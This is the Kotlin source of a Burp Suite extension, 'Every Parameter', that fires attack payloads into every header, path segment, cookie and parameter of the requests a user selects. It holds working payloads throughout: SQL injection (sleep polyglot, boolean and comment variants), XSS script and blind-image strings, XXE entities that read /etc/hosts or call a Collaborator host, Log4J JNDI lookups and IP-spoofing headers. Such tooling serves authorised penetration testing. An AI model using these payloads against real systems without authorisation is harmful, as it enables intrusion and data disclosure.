package com.nickcoblentz.montoya

import burp.api.montoya.BurpExtension
import burp.api.montoya.MontoyaApi
import burp.api.montoya.http.RedirectionMode
import burp.api.montoya.http.RequestOptions
import burp.api.montoya.http.message.HttpRequestResponse
import burp.api.montoya.http.message.params.HttpParameter
import burp.api.montoya.http.message.params.HttpParameterType
import burp.api.montoya.http.message.params.ParsedHttpParameter
import burp.api.montoya.http.message.requests.HttpRequest
import burp.api.montoya.http.message.responses.HttpResponse
import burp.api.montoya.ui.contextmenu.AuditIssueContextMenuEvent
import burp.api.montoya.ui.contextmenu.ContextMenuEvent
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider
import burp.api.montoya.ui.contextmenu.WebSocketContextMenuEvent
import burp.api.montoya.utilities.Base64EncodingOptions
import com.nickcoblentz.montoya.settings.*
import java.awt.Component
import java.awt.event.ActionEvent
import java.util.concurrent.Executors
import javax.swing.JMenuItem


class EveryParameter : BurpExtension, ContextMenuItemsProvider {

    private lateinit var logger: MontoyaLogger
    private lateinit var api: MontoyaApi
    private val sqliQuickMenuItem = JMenuItem("SQLi SLEEP PolyGlot")
    private val sqliLogicPayloadsMenuItem = JMenuItem("SQLi Logic Payloads")
    private val sqliConcatPayloadsMenuItem = JMenuItem("SQLi Concat Payloads")
    private val sqliSingleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi SingleQuoteCommentPayloads")
    private val sqliDoubleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi DoubleQuoteCommentPayloads")
    private val sqliErrorPayloadsMenuItem = JMenuItem("SQLi ErrorPayloads")
    private val xssMapMenuItem = JMenuItem("XSS ASDF")
    private val xssPayloadsMenuItem = JMenuItem("XSS Payloads")
    private val blindXssImgMenuItem = JMenuItem("XSS Blind Img")
    private val xmlOutOfBandMenuItem = JMenuItem("XML OutOfBand")
    private val xmlFileMenuItem = JMenuItem("XML File")
    private val urlPathSpecialCharsMenuItem = JMenuItem("URL Path Special Chars")
    private val collabUrlMenuItem = JMenuItem("Collab Url")
    private val log4jCollabMenuItem = JMenuItem("Log4J Collab")
    private val minimizeMenuItem = JMenuItem("Minimize")
    private val spoofIPMenuItem = JMenuItem("Spoof IP Using Headers")
    private val dnsOverHTTPMenuItem = JMenuItem("DNS-over-HTTP")
    private val allMenuItems = mutableListOf<Component>(sqliQuickMenuItem,sqliErrorPayloadsMenuItem,sqliConcatPayloadsMenuItem,sqliSingleQuoteCommentPayloadsMenuItem,sqliDoubleQuoteCommentPayloadsMenuItem,sqliLogicPayloadsMenuItem,xssMapMenuItem,xssPayloadsMenuItem,blindXssImgMenuItem,xmlOutOfBandMenuItem,xmlFileMenuItem,urlPathSpecialCharsMenuItem,collabUrlMenuItem,log4jCollabMenuItem,spoofIPMenuItem,dnsOverHTTPMenuItem,minimizeMenuItem)
    private var currentHttpRequestResponseList = mutableListOf<HttpRequestResponse>()
    private val executor = Executors.newVirtualThreadPerTaskExecutor()
    private lateinit var followRedirectSetting : BooleanExtensionSetting
    private lateinit var ignoreParametersSetting : ListStringExtensionSetting

    companion object {
        private const val PLUGIN_NAME: String = "Every Parameter"
    }

    override fun initialize(api: MontoyaApi?) {
        requireNotNull(api) {"api : MontoyaApi is not allowed to be null"}

        this.api = api
        logger = MontoyaLogger(api,LogLevel.DEBUG)

        logger.debugLog("Starting...")
        api.extension().setName(PLUGIN_NAME)
        api.userInterface().registerContextMenuItemsProvider(this)
        sqliQuickMenuItem.addActionListener({ e -> sqliQuickActionPerformed(e) })
        sqliLogicPayloadsMenuItem.addActionListener({ e -> sqliLogicPayloadsActionPerformed(e) })
        sqliConcatPayloadsMenuItem.addActionListener({ e -> sqliConcatPayloadsActionPerformed(e) })
        sqliSingleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliSingleQuoteCommentPayloadsActionPerformed(e) })
        sqliDoubleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliDoubleQuoteCommentPayloadsActionPerformed(e) })
        sqliErrorPayloadsMenuItem.addActionListener({ e -> sqliErrorPayloadsActionPerformed(e) })
        xssMapMenuItem.addActionListener({ e -> xssMapActionPerformed(e) })
        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
        blindXssImgMenuItem.addActionListener({ e -> blindXssImgActionPerformed(e) })
        collabUrlMenuItem.addActionListener({ e -> collabUrlActionPerformed(e) })
        xmlOutOfBandMenuItem.addActionListener({ e -> xmlOutOfBandActionPerformed(e) })
        xmlFileMenuItem.addActionListener({ e -> xmlFileActionPerformed(e) })
        urlPathSpecialCharsMenuItem.addActionListener({ e -> urlPathSpecialCharsActionPerformed(e) })
        minimizeMenuItem.addActionListener({ e -> minimizeActionPerformed(e) })
        log4jCollabMenuItem.addActionListener({ e -> log4jCollabActionPerformed(e) })
        spoofIPMenuItem.addActionListener { e -> spoofIpActionPerformed(e) }
        dnsOverHTTPMenuItem.addActionListener { e-> dnsOverHTTPActionPerformed(e)}

        followRedirectSetting = BooleanExtensionSetting(
            api,
            "Follow Redirects?",
            "everyparam.followRedirect",
            false,
            ExtensionSettingSaveLocation.PROJECT)
        ignoreParametersSetting = ListStringExtensionSetting(
            api,
            "Ignore the following Parameters",
            "everyparam.ignoreParam",
            mutableListOf<String>(),
            ExtensionSettingSaveLocation.PROJECT
        )
        val formGenerator = GenericExtensionSettingsFormGenerator(listOf(followRedirectSetting,ignoreParametersSetting),PLUGIN_NAME)
        val settingsFormBuilder = formGenerator.getSettingsFormBuilder()
        val settingsForm = settingsFormBuilder.run()
        api.userInterface().registerContextMenuItemsProvider(ExtensionSettingsContextMenuProvider(api, settingsForm))
        api.extension().registerUnloadingHandler(ExtensionSettingsUnloadHandler(settingsForm))
        logger.debugLog("...Finished")
    }

    override fun provideMenuItems(event: ContextMenuEvent?): MutableList<Component> {
        if(event?.selectedRequestResponses()?.size!!>0)
            currentHttpRequestResponseList=event.selectedRequestResponses()
        else if(event?.messageEditorRequestResponse()?.isPresent==true)
            currentHttpRequestResponseList=mutableListOf(event.messageEditorRequestResponse().get().requestResponse())

        logger.debugLog("Found ${currentHttpRequestResponseList.size} requests")
        if(currentHttpRequestResponseList.size>0)
            return allMenuItems
        return mutableListOf<Component>()
    }

    override fun provideMenuItems(event: WebSocketContextMenuEvent?): MutableList<Component> {
        return mutableListOf<Component>()
    }

    override fun provideMenuItems(event: AuditIssueContextMenuEvent?): MutableList<Component> {
        return mutableListOf<Component>()
    }


    fun dnsOverHTTPActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")

        val listOfHosts = currentHttpRequestResponseList.map { it.httpService()?.host() }.distinct()
        for(host in listOfHosts) {

            val request1 = HttpRequest.httpRequestFromUrl("https://$host/dns-query?dns=EjQBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE").withUpdatedHeader("Accept","application/dns-message")
            val request2 = HttpRequest.httpRequestFromUrl("https://$host/dns-query?name=example.com&type=A").withUpdatedHeader("Accept","application/dns-json")
            val request3 = HttpRequest.httpRequestFromUrl("https://$host/dns-query").withUpdatedHeader("Accept","application/dns-message").withMethod("POST").withBody("\\u00124\\u0001\\u0000\\u0000\\u0001\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0007example\\u0003com\\u0000\\u0000\\u0001\\u0000\\u0001")

            sendRequest(request1,"DNS-over-HTTP GET B64")
            sendRequest(request2,"DNS-over-HTTP GET JSON")
            sendRequest(request3,"DNS-over-HTTP POST Binary")
        }

        logger.debugLog("Exit")
    }

    fun spoofIpActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        val collabGenerator = api.collaborator().defaultPayloadGenerator()

        val spoofPayloads = listOf("127.0.0.1","0","0.0.0.0","10.0.0.2","192.168.0.2",collabGenerator.generatePayload().toString())
        val headers = listOf("CF-Connecting-IP","Client-IP","Forwarded","Forwarded-For","Forwarded-For-Ip","From","Front-End-Https","Origin","Referer","True-Client-IP","Via","X-Azure-ClientIP","X-Azure-SocketIP","X-Client-IP","X-Custom-IP-Authorization","X-Forward","X-Forward-For","X-Forwarded","X-Forwarded-By","X-Forwarded-For","X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Proto","X-Forwarded-Server","X-Forwarded-Ssl","X-Forwared-Host","X-Host","X-HTTP-Host-Override","X-Originating-IP","X-ProxyUser-Ip","X-Real-IP","X-Remote-Addr","X-Remote-IP")
        val justHost = listOf("Host")
        for(spoofPayload in spoofPayloads) {
            addOrReplacePayloadForHeaders(myHttpRequestResponses,headers,spoofPayload,"Spoof IP: $spoofPayload")
            addOrReplacePayloadForHeaders(myHttpRequestResponses,justHost,spoofPayload,"Spoof IP, Host: $spoofPayload")
        }

        for(httpRequestResponse in myHttpRequestResponses) {
            val resolvedIp = httpRequestResponse.httpService().ipAddress()
            addOrReplacePayloadForHeaders(listOf(httpRequestResponse),headers,resolvedIp,"Spoof IP, Server IP: $resolvedIp")
        }
        logger.debugLog("Exit")
    }

    fun addOrReplacePayloadForHeaders(httpRequestResponses : List<HttpRequestResponse>,headers : List<String>, payload : String, annotation : String) {
        logger.debugLog("Enter")
        for(httpRequestResponse in httpRequestResponses)
        {
            var currentHttpRequest = httpRequestResponse.request()
            logger.debugLog("Found request: ${currentHttpRequest.url()}")


            for(header in headers) {
                logger.debugLog("Adding header: $header, ${payload}")
                if(currentHttpRequest.hasHeader(header)) {
                    currentHttpRequest = currentHttpRequest.withUpdatedHeader(header,payload)
                }
                else {
                    currentHttpRequest = currentHttpRequest.withAddedHeader(header,payload)
                }

            }
            sendRequest(currentHttpRequest,annotation)
        }
        logger.debugLog("Exit")
    }

    fun sqliQuickActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadUpdateMode.REPLACE, "SQLi Polyglot-SLEEP \"")
        logger.debugLog("Exit")
    }

    fun urlPathSpecialCharsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        val payloads=listOf("_","-",",",";",":","!","?",".",".aaa",".action",".css",".do",".html",".png","'","\"","(","(4danlfat035muve4g0mvgfrr)","(S(4danlfat035muve4g0mvgfrr))",")","[","[]","[1]","[a]","]","{","{}","{1}","{a}","}","@","*","/","/1","/a","\\","\\1","\\a","&","#","%","%00","%00aaa","%0a","%0a%0a","%0d","%21","%22","%23","%24","%25","%26","%27","%28","%29","%2a","%2A","%2b","%2B","%2c","%2C","%2d","%2D","%2E","%2f","%2F","%3a","%3A","%3b","%3B","%3C","%3c%3e","%3d","%3D","%3E","%3f","%3F","%40","%5B","%5b%5d","%5b1%5d","%5ba%5d","%5c","%5C","%5D","%5e","%5E","%5f","%5F","%60","%7B","%7b%7d","%7b1%7d","%7ba%7d","%7c","%7C","%7D","%7e","%7E","`","^","+","<","<>","=",">","|","~","$")
        for(httpRequestResponse in myHttpRequestResponses) {
            val path = httpRequestResponse.request().path()
            //var index = path.indexOf("/")
            var indices = path.indices.filter { index -> path[index]=='/' }.toMutableList()
            indices.add(-1)
            indices.add(httpRequestResponse.request().pathWithoutQuery().length-1)
            //while (index >= 0) {
            for(index in indices) {
                for (payload in payloads) {
                    val pathWithPayload = StringBuilder(path).insert(index+1,payload)
                    sendRequest(httpRequestResponse.request().withPath(pathWithPayload.toString()).withUpdatedContentLength(),"URL Special Chars, index: ${index}, payload: ${payload}")
                }
                //index = path.indexOf("/", index + 1)
            }

        }
        logger.debugLog("Exit")
    }


    fun xmlOutOfBandActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        val collabGenerator = api.collaborator().defaultPayloadGenerator()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [ <!ENTITY % ext SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> %ext;]>",PayloadUpdateMode.PREPEND, "XML Entity OOB-Prepend")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> ]><test>&xxe</test>",PayloadUpdateMode.REPLACE, "XML Entity OOB-Replace")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\">",PayloadUpdateMode.PREPEND, "XML DTD OOB-Prepend")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\"><asdfa></asdfa>",PayloadUpdateMode.REPLACE, "XML DTD OOB-Replace")
        logger.debugLog("Exit")
    }

    fun xmlFileActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/hosts'>]>",PayloadUpdateMode.PREPEND, "XML Entity File-Prepend,Linux")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [<!ENTITY test SYSTEM 'file://c/windows/system32/drivers/etc/hosts'>]>",PayloadUpdateMode.PREPEND, "XML Entity File-Prepend,Windows")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/hosts'>]><root>&test;</root>",PayloadUpdateMode.REPLACE, "XML Entity File-Replace,Linux")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file://c/windows/system32/drivers/etc/hosts'>]><root>&test;</root>",PayloadUpdateMode.REPLACE, "XML Entity File-Replace,Windows")

        logger.debugLog("Exit")
    }

    fun sqliLogicPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadUpdateMode.APPEND, "SQLi boolean a'")
        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadUpdateMode.APPEND, "SQLi boolean 1'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadUpdateMode.APPEND, "SQLi boolean a\"")
        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadUpdateMode.APPEND, "SQLi boolean 1\"")
        logger.debugLog("Exit")
    }

    fun sqliConcatPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'+'",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat +'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'||'",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat ||'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"' '",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat space'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"+\"",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat +\"")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"||\"",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat ||\"")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\" \"",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat space\"")
        logger.debugLog("Exit")
    }

    fun sqliSingleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'-- ",PayloadUpdateMode.APPEND, "SQLi comment'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"')-- ",PayloadUpdateMode.APPEND, "SQLi comment)'")
        logger.debugLog("Exit")
    }

    fun sqliDoubleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"-- ",PayloadUpdateMode.APPEND, "SQLi comment'")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\")-- ",PayloadUpdateMode.APPEND, "SQLi comment)'")
        logger.debugLog("Exit")
    }

    fun sqliErrorPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"",PayloadUpdateMode.APPEND, "SQLi '\"")
        logger.debugLog("Exit")
    }

    fun xssMapActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\">asdf",PayloadUpdateMode.APPEND, "XSS asdf")
        logger.debugLog("Exit")
    }

    fun blindXssImgActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><img src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/blindimg.png\">asdf",PayloadUpdateMode.APPEND, "Bind XSS Img")
        logger.debugLog("Exit")
    }

    fun collabUrlActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/collaburl",PayloadUpdateMode.REPLACE, "Collab URL")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"test@${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}",PayloadUpdateMode.REPLACE, "Collab EMail")
        logger.debugLog("Exit")
    }

    fun log4jCollabActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:ldap://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j ldap")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:dns://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j dns")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j https")
        logger.debugLog("Exit")
    }

    fun xssPayloadsActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><h2>heading here</h2>asdfh2",PayloadUpdateMode.APPEND, "XSS h2")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><script>alert(1)</script>asdfalert",PayloadUpdateMode.APPEND, "XSS Alert")
        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadUpdateMode.APPEND, "XSS UTF7")
        logger.debugLog("Exit")
    }

    fun minimizeActionPerformed(event: ActionEvent?) {
        logger.debugLog("Enter")
        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
        executor.submit {

            for (httpRequestResponse in myHttpRequestResponses) {
                if (httpRequestResponse.hasResponse()) {
                    for (httpRequestResponse in myHttpRequestResponses) {
                        val originalRequest = httpRequestResponse.request()
                        val originalResponse = httpRequestResponse.response()
                        var currentRequest = originalRequest

                        val headerExceptions = listOf("Content-Length")

                        for (header in currentRequest.headers()) {
                            if(!headerExceptions.contains(header.name())) {
                                val modifiedRequest = currentRequest.withRemovedHeader(header)
                                val httpRequestResponseResult = sendRequestConsiderSettings(modifiedRequest)
                                if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
                                    currentRequest = modifiedRequest
                            }
                        }

                        val supportedParamaterTypes = listOf(
                            HttpParameterType.BODY,
                            HttpParameterType.URL,
                            HttpParameterType.COOKIE,
                            HttpParameterType.MULTIPART_ATTRIBUTE
                        )
                        for (parameter in currentRequest.parameters()) {

                            if (supportedParamaterTypes.contains(parameter.type())) {
                                val modifiedRequest = currentRequest.withRemovedParameters(parameter)
                                val httpRequestResponseResult = sendRequestConsiderSettings(modifiedRequest)
                                if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
                                    currentRequest = modifiedRequest
                            }
                            else {
                                val modifiedRequest =  currentRequest.withUpdatedParsedParameterValue(
                                    parameter,
                                    "",
                                    PayloadUpdateMode.REPLACE
                                )
                                val httpRequestResponseResult = sendRequestConsiderSettings(modifiedRequest)
                                if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
                                    currentRequest = modifiedRequest
                            }

                        }

                        api.repeater().sendToRepeater(currentRequest)
                        api.comparer().sendToComparer(originalRequest.toByteArray(),currentRequest.toByteArray())
                    }
                } else
                    logger.errorLog("Skipping mimize request because it doesn't have a response to compare to")
            }
        }
        //iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadUpdateMode.APPEND, "XSS UTF7")
        logger.debugLog("Exit")
    }

    fun responsesAreSimilar(originalResponse: HttpResponse, currentResponse : HttpResponse) : Boolean
    {
        if( (originalResponse.statusCode()==currentResponse.statusCode()) &&
            (originalResponse.reasonPhrase()==currentResponse.reasonPhrase()) &&
            (originalResponse.statedMimeType()==currentResponse.statedMimeType()) &&
            originalResponse.body().length()>0 == currentResponse.body().length()>0) {
                return true
        }
        return false
    }


    fun iterateThroughParametersWithPayload(httpRequestResponses : List<HttpRequestResponse>, payload : String, payloadType : PayloadUpdateMode, annotation : String)
    {
        logger.debugLog("Enter")
        for(httpRequestResponse in httpRequestResponses)
        {
            val httpRequest = httpRequestResponse.request()
            logger.debugLog("Found request: ${httpRequest.url()}")

            for(header in httpRequest.headers()) {
                logger.debugLog("Found header: ${header.name()}, ${header.value()}")
                sendRequest(httpRequest.withUpdatedHeader(header.name(),api.utilities().urlUtils().encode(payload)),"header: ${header.name()}: $annotation")
            }

            sendRequest(
                httpRequest.withUpdatedHeader(
                    "Authorization",
                    "Basic "+api.utilities().base64Utils().encode("$payload:$payload")),
                    "header: Authorization: Basic: $annotation")

            for(pathSlice in httpRequest.pathSlices()) {
                logger.debugLog("Found path slice: ${pathSlice.value}")
                sendRequest(httpRequest.replacePathSlice(pathSlice,api.utilities().urlUtils().encode(payload)),"pathSlice: ${pathSlice.value}: $annotation")
            }

            for(parameter in httpRequest.parameters())
            {
                logger.debugLog("Found param: ${parameter.name()}, ${parameter.type()}, ${parameter.value()}")
                logger.debugLog("List of ignored values:\n${ignoreParametersSetting.currentValue}")

                if(!ignoreParametersSetting.currentValue.any { parameter.name().equals(it,ignoreCase = true) }) {
                    when (parameter.type()) {
                        HttpParameterType.URL ->
                            sendRequest(
                                httpRequest.withUpdatedParameters(
                                    createUpdatedParameter(
                                        parameter,
                                        api.utilities().urlUtils().encode(payload),
                                        payloadType
                                    )
                                ), "URL Param: ${parameter.name()}: $annotation"
                            )

                        HttpParameterType.BODY ->
                            sendRequest(
                                httpRequest.withUpdatedParameters(
                                    createUpdatedParameter(
                                        parameter,
                                        api.utilities().urlUtils().encode(payload),
                                        payloadType
                                    )
                                ), "Body Param: ${parameter.name()}: $annotation"
                            )

                        HttpParameterType.COOKIE ->
                            sendRequest(
                                httpRequest.withUpdatedParameters(
                                    createUpdatedParameter(
                                        parameter,
                                        api.utilities().urlUtils().encode(payload),
                                        payloadType
                                    )
                                ), "Cookie: ${parameter.name()}: $annotation"
                            )

                        HttpParameterType.MULTIPART_ATTRIBUTE ->
                            sendRequest(
                                httpRequest.withUpdatedParameters(createUpdatedParameter(parameter, payload,payloadType)),
                                "mutipart Param: ${parameter.name()}: $annotation"
                            )

                        HttpParameterType.JSON -> {
                            /*api.logging().logToOutput("Name: ${parameter.name()}")
                            api.logging().logToOutput("Name Start Index Inclusive: ${parameter.nameOffsets().startIndexInclusive()}")
                            api.logging().logToOutput("Name End Index Exclusive: ${parameter.nameOffsets().endIndexExclusive()}")
                            api.logging().logToOutput("Substring of Name: ${httpRequest.toString().substring(parameter.nameOffsets().startIndexInclusive(),parameter.nameOffsets().endIndexExclusive())}")
                            api.logging().logToOutput("Value: ${parameter.value()}")
                            api.logging().logToOutput("Value Start Index Inclusive: ${parameter.valueOffsets().startIndexInclusive()}")
                            api.logging().logToOutput("Value End Index Exclusive: ${parameter.valueOffsets().endIndexExclusive()}")
                            api.logging().logToOutput("Substring of Value: ${httpRequest.toString().substring(parameter.valueOffsets().startIndexInclusive(),parameter.valueOffsets().endIndexExclusive())}")
                            api.logging().logToOutput("Before Value: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}")
                            api.logging().logToOutput("After Value: ${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive(),httpRequest.toString().length)}")
                            api.logging().logToOutput("Prepend Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}PREPEND!!!${httpRequest.toString().substring(parameter.valueOffsets().startIndexInclusive())}")
                            api.logging().logToOutput("Append Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().endIndexExclusive())}APPEND!!!${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive())}")
                            api.logging().logToOutput("Replace Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}REPLACE!!!${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive())}")*/
                            
                            sendRequest(
                                httpRequest.withUpdatedParsedParameterValue(
                                    parameter,
                                    payload.replace("\"", "\\\""),
                                    payloadType
                                ), "URL JSON: ${parameter.name()}: $annotation"
                            )
                        }

                        HttpParameterType.XML -> {
                            sendRequest(
                                httpRequest.withUpdatedParsedParameterValue(
                                    parameter,
                                    api.utilities().htmlUtils().encode(payload),
                                    payloadType
                                ), "URL XML: ${parameter.name()}: $annotation"
                            )
                            sendRequest(
                                httpRequest.withUpdatedParsedParameterValue(
                                    parameter,
                                    payload,
                                    payloadType
                                ), "URL XML: ${parameter.name()}: $annotation"
                            )
                            //at some point, change this from hardcoded replace to something else
                            sendRequest(
                                httpRequest.withUpdatedParsedParameterValue(parameter, "<![CDATA[$payload]]>",PayloadUpdateMode.REPLACE),
                                "URL XML: ${parameter.name()}: $annotation"
                            )
                            sendRequest(
                                httpRequest.withUpdatedParsedParameterValue(parameter, payload,PayloadUpdateMode.REPLACE),
                                "URL XML: ${parameter.name()}: $annotation"
                            )
                        }

                        HttpParameterType.XML_ATTRIBUTE ->
                            sendRequest(
                                    httpRequest.withUpdatedParsedParameterValue(
                                    parameter,
                                    api.utilities().htmlUtils().encode(payload),
                                    payloadType
                                ), "URL XML Attr: ${parameter.name()}: $annotation"
                            )

                        else -> Unit
                    }
                }
                else
                    logger.debugLog("Skipping ${parameter.name()}")

            }
        }
        logger.debugLog("Exit")
    }

    fun createUpdatedParameter(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : HttpParameter {
        logger.debugLog("Enter")
        return HttpParameter.parameter(parsedParameter.name(), insertPayloadAccordingToType(parsedParameter,encodedPayload,payloadType), parsedParameter.type())
    }

    fun insertPayloadAccordingToType(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : String {
        when (payloadType) {
            PayloadUpdateMode.PREPEND -> return encodedPayload + parsedParameter.value()
            PayloadUpdateMode.INSERT_MIDDLE -> {
                val parsedParamValLength = parsedParameter.value().length
                if (parsedParamValLength > 1) {
                    return parsedParameter.value()
                        .substring(0, parsedParamValLength / 2) + encodedPayload + parsedParameter.value()
                        .substring(parsedParamValLength / 2 + 1)
                }
                return encodedPayload + parsedParameter.value()
            }

            PayloadUpdateMode.APPEND -> return parsedParameter.value() + encodedPayload
            else -> return encodedPayload
        }
    }

    fun sendRequest(httpRequest : HttpRequest, annotation : String)
    {
        logger.debugLog("Enter")
        executor.submit {
            val annotatedHttpRequest = httpRequest.withAddedHeader("x-everyparam",api.utilities().base64Utils().encode(annotation,Base64EncodingOptions.URL).toString())
            sendRequestConsiderSettings(annotatedHttpRequest)

        }
        logger.debugLog("Exit")
    }

    fun sendRequestConsiderSettings(httpRequest : HttpRequest) : HttpRequestResponse {
        if(followRedirectSetting.currentValue)
            return api.http().sendRequestWithUpdatedContentLength(httpRequest,RequestOptions.requestOptions().withRedirectionMode(RedirectionMode.ALWAYS))
        else
            return api.http().sendRequestWithUpdatedContentLength(httpRequest)
    }

}

